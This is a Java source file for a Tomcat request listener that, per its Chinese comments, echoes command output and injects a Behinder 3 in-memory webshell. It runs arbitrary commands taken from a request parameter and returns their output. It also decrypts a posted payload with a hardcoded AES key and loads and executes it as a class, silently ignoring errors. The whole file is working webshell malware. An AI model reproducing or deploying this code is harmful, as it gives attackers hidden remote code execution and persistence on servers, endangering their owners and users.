package ccdr4gon.utils;


import org.apache.catalina.connector.Request;
import org.apache.catalina.connector.RequestFacade;
import org.apache.catalina.connector.Response;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.*;
import javax.servlet.http.HttpSession;
import javax.servlet.jsp.PageContext;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.lang.reflect.Field;
import java.util.Base64;


public class Dr4gonListener implements ServletRequestListener {
    @Override
    public void requestDestroyed(ServletRequestEvent servletRequestEvent) { }
    //listener实现回显+注入冰蝎内存马
    @Override
    public void requestInitialized(ServletRequestEvent servletRequestEvent) {
        RequestFacade requestfacade= (RequestFacade) servletRequestEvent.getServletRequest();
        try {
            Field field = requestfacade.getClass().getDeclaredField("request");
            field.setAccessible(true);
            Request request = (Request) field.get(requestfacade);
            Response response = request.getResponse();
            HttpSession session = request.getSession();
            PageContext pageContext = (PageContext) new Dr4gonContext(request, response, session);
            //回显
            if (request.getParameter("stage").equals("echo")) {
                String cmd=request.getParameter("cmd");
                java.io.InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();
                InputStreamReader isr;
                if(request.getParameter("gbk").equals("true")){
                    isr = new java.io.InputStreamReader(in,"GBK");
                }else {
                    isr = new java.io.InputStreamReader(in);
                }
                BufferedReader br= new java.io.BufferedReader(isr);
                StringBuilder stringBuilder = new StringBuilder();
                String line;
                while ((line = br.readLine()) != null){
                    stringBuilder.append(line+"\n");
                }
                String result = stringBuilder.toString();
                if(request.getParameter("gbk").equals("true")){
                    response.setCharacterEncoding("GBK");
                }
                response.getWriter().write(result);
                response.getWriter().write("\n=========end=========\n");
            }
            //注入冰蝎3内存马
            if (request.getParameter("stage").equals("s")) {
                String k = "e45e329feb5d925b";
                session.putValue("u", k);
                Cipher c = Cipher.getInstance("AES");
                c.init(2, new SecretKeySpec(k.getBytes(), "AES"));
                new U(this.getClass().getClassLoader()).g(c.doFinal(Base64.getDecoder().decode(request.getReader().readLine()))).newInstance().equals(pageContext);
            }
        } catch (Exception ignored) {
        }
    }
}
